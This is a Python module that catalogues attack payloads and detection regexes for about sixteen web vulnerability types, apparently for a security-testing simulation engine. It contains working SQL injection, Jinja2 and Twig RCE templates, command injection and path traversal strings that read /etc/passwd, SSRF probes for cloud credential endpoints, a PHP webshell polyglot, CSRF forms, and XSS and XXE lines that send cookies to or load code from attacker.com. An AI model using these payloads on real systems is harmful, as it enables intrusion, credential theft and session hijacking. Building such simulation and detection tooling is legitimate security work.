"""
Attack payloads for each vulnerability type.

Used by the tool simulation engine to generate realistic test output.
All payloads are sourced from real-world security research and are intended
for simulation purposes only -- not for attacking real systems.
"""

from dataclasses import dataclass, field
from typing import Dict, List


@dataclass
class PayloadSet:
    """A collection of attack payloads and detection indicators for a vulnerability type."""

    vuln_type_id: str
    payloads: List[Dict[str, str]]  # Each dict has keys: payload, technique, description
    indicators: List[str]  # Regex patterns that indicate the vuln is present in a response


# ---------------------------------------------------------------------------
# SQL Injection
# ---------------------------------------------------------------------------
SQLI = PayloadSet(
    vuln_type_id="sqli",
    payloads=[
        {
            "payload": "' OR 1=1--",
            "technique": "error-based",
            "description": "Classic tautology payload to bypass WHERE clauses or trigger SQL syntax errors.",
        },
        {
            "payload": "' AND 1=CONVERT(int,(SELECT @@version))--",
            "technique": "error-based",
            "description": "MSSQL error-based extraction that forces a type-conversion error leaking the DB version.",
        },
        {
            "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
            "technique": "error-based",
            "description": "MySQL EXTRACTVALUE error-based injection to exfiltrate the database version.",
        },
        {
            "payload": "' UNION SELECT username,password,NULL FROM users--",
            "technique": "union-based",
            "description": "Union-based injection to extract credentials from a users table (3-column variant).",
        },
        {
            "payload": "' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
            "technique": "union-based",
            "description": "MySQL union-based enumeration of all table names in the current database.",
        },
        {
            "payload": "' AND SUBSTRING((SELECT database()),1,1)='a'--",
            "technique": "blind-boolean",
            "description": "Boolean-based blind injection extracting the first character of the database name.",
        },
        {
            "payload": "' AND IF(1=1,SLEEP(5),0)--",
            "technique": "blind-time",
            "description": "MySQL time-based blind injection using conditional SLEEP to confirm injectability.",
        },
        {
            "payload": "'; WAITFOR DELAY '0:0:5'--",
            "technique": "blind-time",
            "description": "MSSQL time-based blind injection using WAITFOR DELAY.",
        },
    ],
    indicators=[
        r"(?i)you have an error in your sql syntax",
        r"(?i)mysql_fetch_array\(\)",
        r"(?i)OLE DB Provider for SQL Server",
        r"(?i)Unclosed quotation mark",
        r"(?i)ORA-\d{5}",
        r"(?i)unterminated quoted string",
        r"(?i)invalid input syntax for type integer",
        r"(?i)ERROR:\s+syntax error at or near",
        r"(?i)UNION\s+SELECT.*FROM\s+users",
        r"(?i)sqlmap identified the following injection point",
        r"(?i)parameter .* (is|appears to be) .* injectable",
        r"(?i)back-end DBMS is",
        r"(?i)\$2[aby]\$\d{2}\$",  # bcrypt hashes leaked
        r"(?i)information_schema\.tables",
    ],
)


# ---------------------------------------------------------------------------
# XSS -- Reflected
# ---------------------------------------------------------------------------
XSS_REFLECTED = PayloadSet(
    vuln_type_id="xss_reflected",
    payloads=[
        {
            "payload": '<script>alert(document.domain)</script>',
            "technique": "script-tag",
            "description": "Basic reflected XSS with script tag to display the current domain.",
        },
        {
            "payload": '"><script>alert(1)</script>',
            "technique": "script-tag",
            "description": "Script injection breaking out of an HTML attribute context with a double-quote.",
        },
        {
            "payload": "<img src=x onerror=alert(1)>",
            "technique": "event-handler",
            "description": "Event handler XSS via a broken image tag triggering onerror.",
        },
        {
            "payload": "<svg onload=alert(1)>",
            "technique": "event-handler",
            "description": "SVG onload event handler for inline script execution.",
        },
        {
            "payload": "<details open ontoggle=alert(1)>",
            "technique": "event-handler",
            "description": "HTML5 details element with ontoggle event for XSS without user interaction.",
        },
        {
            "payload": "<ScRiPt>alert(String.fromCharCode(88,83,83))</sCrIpT>",
            "technique": "filter-bypass",
            "description": "Mixed-case script tag with String.fromCharCode to bypass basic keyword filters.",
        },
    ],
    indicators=[
        r"<script>alert\(",
        r"(?i)<script>.*</script>",
        r"onerror\s*=\s*alert",
        r"onload\s*=\s*alert",
        r"ontoggle\s*=\s*alert",
        r"(?i)You searched for:.*<script>",
        r"(?i)cross-site scripting",
        r"(?i)XSS.*vulnerability",
        r"(?i)payload.*reflected.*without.*encoding",
        r"(?i)reflected.*unmodified",
    ],
)


# ---------------------------------------------------------------------------
# XSS -- Stored
# ---------------------------------------------------------------------------
XSS_STORED = PayloadSet(
    vuln_type_id="xss_stored",
    payloads=[
        {
            "payload": "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>",
            "technique": "script-tag",
            "description": "Stored XSS payload that exfiltrates session cookies to an attacker-controlled server.",
        },
        {
            "payload": '<img src=x onerror="fetch(\'https://attacker.com/log?c=\'+document.cookie)">',
            "technique": "event-handler",
            "description": "Image tag onerror cookie-stealing payload for stored XSS in comment fields.",
        },
        {
            "payload": '<svg onload="navigator.sendBeacon(\'https://attacker.com/log\',document.cookie)">',
            "technique": "event-handler",
            "description": "SVG onload using sendBeacon API for stealthy cookie exfiltration.",
        },
        {
            "payload": '<a href="javascript:alert(document.domain)">Click me</a>',
            "technique": "javascript-uri",
            "description": "JavaScript URI in anchor tag for stored XSS in user-generated links or profiles.",
        },
        {
            "payload": "<script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>",
            "technique": "script-tag",
            "description": "Image beacon technique to silently exfiltrate cookies through a new Image object.",
        },
    ],
    indicators=[
        r"<script>.*document\.cookie.*</script>",
        r"(?i)onerror\s*=.*fetch\(",
        r"(?i)onload\s*=.*sendBeacon",
        r"(?i)javascript:alert",
        r"(?i)stored.*cross-site scripting",
        r"(?i)persistent.*XSS",
        r"(?i)payload.*stored.*in.*database",
        r"(?i)cookie.*exfiltrat",
    ],
)


# ---------------------------------------------------------------------------
# SSRF
# ---------------------------------------------------------------------------
SSRF = PayloadSet(
    vuln_type_id="ssrf",
    payloads=[
        {
            "payload": "http://127.0.0.1/",
            "technique": "localhost",
            "description": "Basic SSRF probe to the loopback address to detect internal service access.",
        },
        {
            "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "technique": "cloud-metadata",
            "description": "AWS IMDSv1 metadata endpoint to retrieve IAM role credentials.",
        },
        {
            "payload": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "technique": "cloud-metadata",
            "description": "GCP metadata endpoint to obtain the default service account OAuth token.",
        },
        {
            "payload": "http://10.0.0.1:8080/",
            "technique": "internal-network",
            "description": "Internal network pivot probing a common gateway address on port 8080.",
        },
        {
            "payload": "http://[::1]/",
            "technique": "localhost-bypass",
            "description": "IPv6 loopback to bypass allowlists that only check for 127.0.0.1.",
        },
    ],
    indicators=[
        r"(?i)AccessKeyId",
        r"(?i)SecretAccessKey",
        r"(?i)AKIA[A-Z0-9]{16}",
        r"(?i)internal[- _]?admin",
        r"(?i)mysql://.*@10\.",
        r"(?i)metadata.*instance",
        r"(?i)computeMetadata",
        r"(?i)169\.254\.169\.254",
        r"(?i)Connection refused",
        r"(?i)Collaborator.*interaction",
        r"(?i)internal.*server.*IP",
    ],
)


# ---------------------------------------------------------------------------
# SSTI
# ---------------------------------------------------------------------------
SSTI = PayloadSet(
    vuln_type_id="ssti",
    payloads=[
        {
            "payload": "{{7*7}}",
            "technique": "detection",
            "description": "Universal SSTI detection probe -- Jinja2 returns 49, Twig returns 49, literal text means safe.",
        },
        {
            "payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "technique": "jinja2-rce",
            "description": "Jinja2 RCE via config globals chain to execute OS commands.",
        },
        {
            "payload": "{{''.__class__.__mro__[1].__subclasses__()}}",
            "technique": "jinja2-enumeration",
            "description": "Jinja2 MRO chain to enumerate available subclasses for gadget discovery.",
        },
        {
            "payload": "{{['id']|filter('system')}}",
            "technique": "twig-rce",
            "description": "Twig template injection using the filter function to call PHP system().",
        },
    ],
    indicators=[
        r"(?i)\b49\b",  # math evaluation of 7*7
        r"uid=\d+\(",   # id command output
        r"(?i)www-data",
        r"(?i)Hello,\s*49",
        r"(?i)Jinja2 plugin has confirmed injection",
        r"(?i)template injection",
        r"(?i)SECRET_KEY",
        r"(?i)__class__.*__subclasses__",
    ],
)


# ---------------------------------------------------------------------------
# Command Injection
# ---------------------------------------------------------------------------
COMMAND_INJECTION = PayloadSet(
    vuln_type_id="command_injection",
    payloads=[
        {
            "payload": "; id",
            "technique": "semicolon",
            "description": "Semicolon-separated command appended to the original input to execute 'id'.",
        },
        {
            "payload": "| cat /etc/passwd",
            "technique": "pipe",
            "description": "Pipe operator to redirect the previous command's output and read /etc/passwd.",
        },
        {
            "payload": "`whoami`",
            "technique": "backtick",
            "description": "Backtick command substitution to inject 'whoami' into the command string.",
        },
        {
            "payload": "$(cat /etc/passwd)",
            "technique": "dollar-substitution",
            "description": "Dollar-paren command substitution to read system password file.",
        },
        {
            "payload": "|| sleep 10",
            "technique": "blind-time",
            "description": "OR-chained sleep command for blind time-based command injection detection.",
        },
    ],
    indicators=[
        r"uid=\d+\(",
        r"root:x:0:0:",
        r"www-data",
        r"(?i)gid=\d+\(",
        r"(?i)groups=\d+\(",
        r"(?i)Linux.*GNU/Linux",
        r"(?i)command injection",
        r"(?i)results-based OS command injection",
        r"(?i)Response time.*\d{4,}ms",  # abnormal response delay
    ],
)


# ---------------------------------------------------------------------------
# IDOR / BOLA
# ---------------------------------------------------------------------------
IDOR = PayloadSet(
    vuln_type_id="idor",
    payloads=[
        {
            "payload": "GET /api/v1/users/1002  (authenticated as user 1001)",
            "technique": "sequential-id",
            "description": "Increment the user ID in the URL to access another user's data.",
        },
        {
            "payload": "PUT /api/v1/users/1002  {\"role\": \"admin\"}  (authenticated as user 1001)",
            "technique": "sequential-id-write",
            "description": "Modify another user's resource by changing the object ID in a PUT request.",
        },
        {
            "payload": "GET /api/v1/documents/550e8400-e29b-41d4-a716-446655440000",
            "technique": "uuid-guessing",
            "description": "Attempt to access a document with a guessed or leaked UUID.",
        },
    ],
    indicators=[
        r"(?i)\"id\":\s*\d+,\s*\"name\"",
        r"(?i)\"ssn\"",
        r"(?i)\"credit_card\"",
        r"(?i)another user's data",
        r"(?i)Authorization Status:\s*BYPASSED",
        r"(?i)IDOR CONFIRMED",
        r"(?i)User updated successfully",
        r"(?i)\"email\":.*@.*\.\w+",
    ],
)

BOLA = PayloadSet(
    vuln_type_id="bola",
    payloads=IDOR.payloads,
    indicators=IDOR.indicators,
)


# ---------------------------------------------------------------------------
# Path Traversal
# ---------------------------------------------------------------------------
PATH_TRAVERSAL = PayloadSet(
    vuln_type_id="path_traversal",
    payloads=[
        {
            "payload": "../../../etc/passwd",
            "technique": "basic",
            "description": "Classic directory traversal to read the Unix password file.",
        },
        {
            "payload": "..%2f..%2f..%2fetc%2fpasswd",
            "technique": "url-encoded",
            "description": "URL-encoded slashes to bypass simple string-match filters.",
        },
        {
            "payload": "....//....//....//etc/passwd",
            "technique": "double-dot-bypass",
            "description": "Nested traversal sequences that survive a single round of '../' stripping.",
        },
        {
            "payload": "..\\..\\..\\windows\\win.ini",
            "technique": "windows",
            "description": "Backslash directory traversal targeting Windows systems.",
        },
    ],
    indicators=[
        r"root:x:0:0:",
        r"daemon:x:1:1:",
        r"www-data:x:33:33:",
        r"(?i)\[fonts\]",  # win.ini content
        r"(?i)path traversal vulnerability",
        r"(?i)Retrieved file begins with.*root:x:0:0",
        r"(?i)Directory traversal in web application",
    ],
)


# ---------------------------------------------------------------------------
# XXE
# ---------------------------------------------------------------------------
XXE = PayloadSet(
    vuln_type_id="xxe",
    payloads=[
        {
            "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>',
            "technique": "basic-entity",
            "description": "Classic XXE with an external entity referencing /etc/passwd for direct file read.",
        },
        {
            "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><root>&xxe;</root>',
            "technique": "external-entity-ssrf",
            "description": "XXE to SSRF -- external entity fetches AWS metadata credentials.",
        },
        {
            "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><root>test</root>',
            "technique": "parameter-entity-oob",
            "description": "Blind XXE using a parameter entity to load an external DTD for out-of-band exfiltration.",
        },
    ],
    indicators=[
        r"root:x:0:0:",
        r"(?i)ENTITY.*SYSTEM",
        r"(?i)XML external entity injection",
        r"(?i)DOCTYPE",
        r"(?i)FileNotFoundException.*root:x:",
        r"(?i)DNS.*HTTP interaction.*observed",
        r"(?i)Collaborator.*interaction",
    ],
)


# ---------------------------------------------------------------------------
# Broken Authentication / Default Credentials
# ---------------------------------------------------------------------------
BROKEN_AUTH = PayloadSet(
    vuln_type_id="broken_auth",
    payloads=[
        {
            "payload": "admin:admin",
            "technique": "default-credentials",
            "description": "Most common default credential pair found across web applications.",
        },
        {
            "payload": "admin:password",
            "technique": "default-credentials",
            "description": "Widely used default password for admin accounts.",
        },
        {
            "payload": "admin:password123",
            "technique": "default-credentials",
            "description": "Common weak password variant with numeric suffix.",
        },
        {
            "payload": "root:toor",
            "technique": "default-credentials",
            "description": "Default root credentials common on Kali Linux, some appliances, and lab environments.",
        },
        {
            "payload": "tomcat:s3cret",
            "technique": "default-credentials",
            "description": "Apache Tomcat Manager default credentials.",
        },
        {
            "payload": "admin:admin123",
            "technique": "default-credentials",
            "description": "Common default credential pair for management interfaces.",
        },
        {
            "payload": "guest:guest",
            "technique": "default-credentials",
            "description": "Guest account with matching password, common in legacy systems.",
        },
        {
            "payload": "test:test",
            "technique": "default-credentials",
            "description": "Test account left enabled in production environments.",
        },
    ],
    indicators=[
        r"(?i)Login successful",
        r"(?i)302.*Location:.*dashboard",
        r"(?i)Set-Cookie:\s*session=",
        r"(?i)\"role\":\s*\"admin\"",
        r"(?i)valid password(s)? found",
        r"(?i)http-default-accounts",
        r"(?i)\[.*\]\s*host:.*login:.*password:",
        r"(?i)Authentication.*bypass",
    ],
)


# ---------------------------------------------------------------------------
# Weak TLS / Cryptographic Failures
# ---------------------------------------------------------------------------
WEAK_TLS = PayloadSet(
    vuln_type_id="weak_tls",
    payloads=[
        {
            "payload": "openssl s_client -connect target:443 -ssl3",
            "technique": "protocol-test",
            "description": "Test whether the server negotiates the insecure SSLv3 protocol.",
        },
        {
            "payload": "openssl s_client -connect target:443 -cipher RC4",
            "technique": "cipher-test",
            "description": "Test whether the server accepts the broken RC4 cipher.",
        },
        {
            "payload": "nmap --script ssl-enum-ciphers -p 443 target",
            "technique": "cipher-enumeration",
            "description": "Enumerate all supported TLS versions and cipher suites on the target.",
        },
    ],
    indicators=[
        r"(?i)SSLv3.*offered.*NOT ok",
        r"(?i)TLS 1\.0.*offered.*deprecated",
        r"(?i)TLS 1\.1.*offered.*deprecated",
        r"(?i)RC4.*deprecated",
        r"(?i)POODLE.*VULNERABLE",
        r"(?i)SWEET32.*VULNERABLE",
        r"(?i)RC4.*VULNERABLE",
        r"(?i)Certificate.*Expiration.*expires < \d+ days",
        r"(?i)least strength:\s*C",
        r"(?i)Broken cipher RC4",
        r"(?i)64-bit block cipher 3DES",
        r"(?i)Set-Cookie:.*(?!.*Secure)(?!.*HttpOnly)",
    ],
)


# ---------------------------------------------------------------------------
# Security Misconfiguration
# ---------------------------------------------------------------------------
SECURITY_MISCONFIG = PayloadSet(
    vuln_type_id="security_misconfig",
    payloads=[
        {
            "payload": "GET /.env",
            "technique": "exposed-file",
            "description": "Check for exposed .env file containing database credentials and API keys.",
        },
        {
            "payload": "GET /.git/HEAD",
            "technique": "exposed-file",
            "description": "Check for exposed Git repository allowing source code download.",
        },
        {
            "payload": "GET /server-status",
            "technique": "exposed-endpoint",
            "description": "Apache mod_status page revealing active connections and server internals.",
        },
        {
            "payload": "GET /actuator/env",
            "technique": "exposed-endpoint",
            "description": "Spring Boot Actuator endpoint exposing application configuration and environment variables.",
        },
        {
            "payload": "GET /phpinfo.php",
            "technique": "exposed-endpoint",
            "description": "phpinfo() page disclosing full server configuration, modules, and environment variables.",
        },
        {
            "payload": "GET /admin",
            "technique": "exposed-endpoint",
            "description": "Unauthenticated access to an administrative panel.",
        },
    ],
    indicators=[
        r"(?i)Index of /",
        r"(?i)ref:\s*refs/heads/",
        r"(?i)DB_PASSWORD\s*=",
        r"(?i)AWS_SECRET_ACCESS_KEY\s*=",
        r"(?i)STRIPE_SECRET_KEY\s*=",
        r"(?i)phpinfo\(\)",
        r"(?i)PHP Version \d",
        r"(?i)Apache server-status",
        r"(?i)spring\.datasource\.(url|username|password)",
        r"(?i)Server:\s*Apache/[\d.]+",
        r"(?i)X-Powered-By:\s*PHP/[\d.]+",
        r"(?i)Directory indexing found",
        r"(?i)\.env file found",
        r"(?i)Git repository found",
        r"(?i)Access-Control-Allow-Origin:\s*https?://evil",
        r"(?i)Access-Control-Allow-Credentials:\s*true",
    ],
)


# ---------------------------------------------------------------------------
# File Upload
# ---------------------------------------------------------------------------
FILE_UPLOAD = PayloadSet(
    vuln_type_id="file_upload",
    payloads=[
        {
            "payload": "shell.php  (Content-Type: image/jpeg)",
            "technique": "content-type-spoofing",
            "description": "Upload a PHP webshell with a spoofed image Content-Type header.",
        },
        {
            "payload": "shell.phtml",
            "technique": "extension-bypass",
            "description": "Use alternative PHP extension (.phtml) to bypass extension blocklist.",
        },
        {
            "payload": "shell.php.jpg",
            "technique": "double-extension",
            "description": "Double extension to bypass filters that only check the last extension.",
        },
        {
            "payload": "GIF89a<?php system($_GET['cmd']); ?>",
            "technique": "magic-bytes-polyglot",
            "description": "Polyglot file with GIF magic bytes header prepended to PHP webshell code.",
        },
    ],
    indicators=[
        r"(?i)File uploaded successfully",
        r"(?i)/uploads/.*\.ph(p|tml|ar)",
        r"(?i)uid=\d+\(www-data\)",
        r"(?i)PHP code executed",
        r"(?i)Webshell accessible at",
        r"(?i)VULNERABLE.*File upload restriction can be bypassed",
    ],
)


# ---------------------------------------------------------------------------
# CSRF
# ---------------------------------------------------------------------------
CSRF = PayloadSet(
    vuln_type_id="csrf",
    payloads=[
        {
            "payload": (
                '<html><body>'
                '<form action="https://target.example.com/account/change-email" method="POST" id="csrf-form">'
                '<input type="hidden" name="email" value="attacker@evil.com">'
                '</form>'
                '<script>document.getElementById("csrf-form").submit();</script>'
                '</body></html>'
            ),
            "technique": "auto-submit-form",
            "description": "Auto-submitting HTML form that changes the victim's email address on page load.",
        },
        {
            "payload": (
                '<script>'
                'fetch("https://target.example.com/api/account/change-password",'
                '{method:"POST",credentials:"include",'
                'headers:{"Content-Type":"application/json"},'
                'body:JSON.stringify({"new_password":"hacked123"})});'
                '</script>'
            ),
            "technique": "json-csrf",
            "description": "JavaScript fetch-based CSRF targeting a JSON API password-change endpoint.",
        },
        {
            "payload": "POST /change-email  email=attacker@evil.com  (csrf_token parameter removed)",
            "technique": "token-removal",
            "description": "Submit the state-changing request without the CSRF token to test if validation is enforced.",
        },
    ],
    indicators=[
        r"(?i)Email updated successfully",
        r"(?i)does not.*use anti-CSRF tokens",
        r"(?i)No CSRF token.*identified",
        r"(?i)SameSite.*not set",
        r"(?i)cross-site request forgery",
        r"(?i)state-changing.*without.*token",
    ],
)


# ---------------------------------------------------------------------------
# Missing Rate Limiting
# ---------------------------------------------------------------------------
MISSING_RATE_LIMITING = PayloadSet(
    vuln_type_id="missing_rate_limiting",
    payloads=[
        {
            "payload": "Send 100+ POST /login requests with sequential passwords in rapid succession",
            "technique": "login-brute-force",
            "description": "Rapid credential stuffing against the login endpoint with no delay between requests.",
        },
        {
            "payload": "POST /verify-otp with otp=0000 through otp=9999",
            "technique": "otp-brute-force",
            "description": "Enumerate all 4-digit OTP values with no rate limiting on the verification endpoint.",
        },
        {
            "payload": "Repeat request with rotating X-Forwarded-For headers (1.2.3.4, 1.2.3.5, ...)",
            "technique": "header-bypass",
            "description": "Bypass IP-based rate limiting by spoofing the X-Forwarded-For header on each request.",
        },
    ],
    indicators=[
        r"(?i)1\d{3}.*tries/min",
        r"(?i)\d+ requests.*without.*blocking",
        r"(?i)valid password found",
        r"(?i)Rate limit.*bypass",
        r"(?i)X-Forwarded-For.*resets rate limit",
        r"(?i)No rate limit",
        r"(?i)Account.*not.*locked",
    ],
)


# ---------------------------------------------------------------------------
# Registry -- all payload sets keyed by vuln_type_id
# ---------------------------------------------------------------------------
_REGISTRY: Dict[str, PayloadSet] = {
    ps.vuln_type_id: ps
    for ps in [
        SQLI,
        XSS_REFLECTED,
        XSS_STORED,
        SSRF,
        SSTI,
        COMMAND_INJECTION,
        IDOR,
        BOLA,
        PATH_TRAVERSAL,
        XXE,
        BROKEN_AUTH,
        WEAK_TLS,
        SECURITY_MISCONFIG,
        FILE_UPLOAD,
        CSRF,
        MISSING_RATE_LIMITING,
    ]
}


def get_payloads(vuln_type_id: str) -> PayloadSet:
    """Return the PayloadSet for a given vulnerability type ID.

    Raises:
        KeyError: if *vuln_type_id* is not found in the registry.
    """
    try:
        return _REGISTRY[vuln_type_id]
    except KeyError:
        raise KeyError(
            f"Unknown vuln_type_id '{vuln_type_id}'. "
            f"Available types: {sorted(_REGISTRY.keys())}"
        )


def get_all_payload_sets() -> Dict[str, PayloadSet]:
    """Return a dictionary of all registered PayloadSets, keyed by vuln_type_id."""
    return dict(_REGISTRY)
